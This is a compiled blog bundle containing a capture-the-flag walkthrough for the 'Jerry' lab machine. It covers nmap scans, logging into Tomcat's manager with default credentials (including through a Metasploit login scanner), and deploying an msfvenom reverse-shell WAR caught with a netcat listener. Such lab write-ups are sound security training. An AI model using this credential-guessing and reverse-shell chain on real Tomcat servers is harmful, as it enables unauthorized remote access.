"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[905],{362:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-1-9bc478d2c4c78cf3404b0c25a80bdfce.png"},1659:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-8-09af0a711e62d49783cddede3487b0d1.png"},1772:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-7-bb38c07471055921e123bb8eb4812166.png"},2658:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-9-76a69ce4d2d0651e8e5e429b3b3f6f5d.png"},3060:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-13e88223d5fcbe743d32858ceda2d22e.png"},4661:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-6-b730756cc58d8a5efdd00ae6ffd2a0f1.png"},5080:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-3-dd6c3ee530600db4dff963a82b2500d0.png"},5648:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-j-10-1a456c60f264d148761cf339e345eaac.png"},6857:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>r,toc:()=>p});var n=a(8168),s=(a(6540),a(5680));const o={},i=void 0,r={permalink:"/Blog/blog/Jerry",editUrl:"https://github.com/danae-pan/Blog/blog/Jerry.md",source:"@site/blog/Jerry.md",title:"Jerry",description:"Task1",date:"2025-04-04T21:17:12.978Z",formattedDate:"April 4, 2025",tags:[],readingTime:3.255,truncated:!1,authors:[],prevItem:{title:"Sau",permalink:"/Blog/blog/Sau"},nextItem:{title:"GoodGames",permalink:"/Blog/blog/GoodGames"}},l={authorsImageUrls:[]},p=[{value:"Task1",id:"task1",children:[]},{value:"Task 2",id:"task-2",children:[]},{value:"Task 3",id:"task-3",children:[]},{value:"Task 4",id:"task-4",children:[]},{value:"Task 5",id:"task-5",children:[]},{value:"Task 6",id:"task-6",children:[]}],g={toc:p},d="wrapper";function h(e){let{components:t,...o}=e;return(0,s.yg)(d,(0,n.A)({},g,o,{components:t,mdxType:"MDXLayout"}),(0,s.yg)("h3",{id:"task1"},"Task1"),(0,s.yg)("p",null,"Which TCP port is open on the remote host?"),(0,s.yg)("p",null,"Run nmap to scan for ports"),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"nmap -sS -p- <target_ip>")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(3060).A})),(0,s.yg)("p",null,"After scanning, the port 8080 is revelead to be open, where the http-proxy service is running."),(0,s.yg)("h3",{id:"task-2"},"Task 2"),(0,s.yg)("p",null,"Which web server is running on the remote host? Looking for two words."),(0,s.yg)("p",null,"To find the web server, we need to add the version field on the nmap scan."),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"nmap -sV -p 8080 <target_ip>")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(362).A})),(0,s.yg)("p",null,"We see on the version that the web server is ",(0,s.yg)("strong",{parentName:"p"},"Apache Tomcat"),"."),(0,s.yg)("h3",{id:"task-3"},"Task 3"),(0,s.yg)("p",null,"Which relative path on the webserver leads to the Web Application Manager?"),(0,s.yg)("p",null,"Open a browser and navigate to the ip address of the target. Remember to specify the port to be 8080."),(0,s.yg)("p",null,"Take a look at the page, to see you can find anything useful. Under ",(0,s.yg)("strong",{parentName:"p"},"Managing Tomcat")," you see a URL to ",(0,s.yg)("strong",{parentName:"p"},"manager webapp")," which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in ",(0,s.yg)("strong",{parentName:"p"},"$CATALINA_HOME/conf/tomcat-users.xml"),". This seems like an interesting information, but let's first see what the URL gets us. When clicking we get redirected to ",(0,s.yg)("strong",{parentName:"p"},"/manager/html")," where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for."),(0,s.yg)("h3",{id:"task-4"},"Task 4"),(0,s.yg)("p",null,"What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password"),(0,s.yg)("p",null,"On the previous step, we navigated to the ",(0,s.yg)("strong",{parentName:"p"},"/manager/html")," were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(4661).A})),(0,s.yg)("p",null,"Another approach to this, is using ",(0,s.yg)("strong",{parentName:"p"},"Metasploit Framework"),". First, run ",(0,s.yg)("inlineCode",{parentName:"p"},"msfconsole")," and then ",(0,s.yg)("inlineCode",{parentName:"p"},"search tomcat"),". There you will find the auxiliary ",(0,s.yg)("strong",{parentName:"p"},"auxiliary/scanner/http/tomcat_mgr_login")," which will attempt to login based on a list of username - password names. To use it, run ",(0,s.yg)("inlineCode",{parentName:"p"},"use <number_of_option>")," and then to see what you it is required for you to set ",(0,s.yg)("inlineCode",{parentName:"p"},"show options"),". "),(0,s.yg)("p",null,"To select the target IP address and the port, run ",(0,s.yg)("inlineCode",{parentName:"p"},"set RHOSTS <target_ip>")," and ",(0,s.yg)("inlineCode",{parentName:"p"},"set RPORT <target_port>"),". Then type ",(0,s.yg)("inlineCode",{parentName:"p"},"run")," and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(1772).A})),(0,s.yg)("h3",{id:"task-5"},"Task 5"),(0,s.yg)("p",null,"Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?"),(0,s.yg)("p",null,"After authenticating in the previous page, you will see this part in the Web Application Manager page:"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(5080).A})),(0,s.yg)("p",null,"We can see that the file type is ",(0,s.yg)("strong",{parentName:"p"},"WAR"),". "),(0,s.yg)("h3",{id:"task-6"},"Task 6"),(0,s.yg)("p",null,"Submit the flag located on the user's desktop."),(0,s.yg)("p",null,"From the previous task, we realised we would be able to upload a war file, which smells like a backdoor we could use for remote code execution. A war file is used to deploy java based applications and we can use it to deploy a reverse shell and gain remote access to the target system. "),(0,s.yg)("p",null,"We can generate a war file using msfvenom "),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f war > shell.war")),(0,s.yg)("p",null,"An open the port that was specified so we can listen to the connection from the target"),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"sudo nc -lvnp <your_port>")),(0,s.yg)("p",null,"Then we navigate to the manager page and upload the war payload.\nOn the list of applications we can see our deployment "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(1659).A})),(0,s.yg)("p",null,"Then we can navigate to the ",(0,s.yg)("strong",{parentName:"p"},"/shell")," path and on our temrminal that we opened the port we can see are connected!"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(2658).A})),(0,s.yg)("p",null,"Navigating to the directory ",(0,s.yg)("strong",{parentName:"p"},"\\Users\\Administrator\\Desktop")," and lisitng the direcrtories, we find a folder named flags. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(5648).A})),(0,s.yg)("p",null,"Running ",(0,s.yg)("inlineCode",{parentName:"p"},'type "2 for the price of 1.txt"')," we get both the user and the root flags."))}h.isMDXComponent=!0}}]);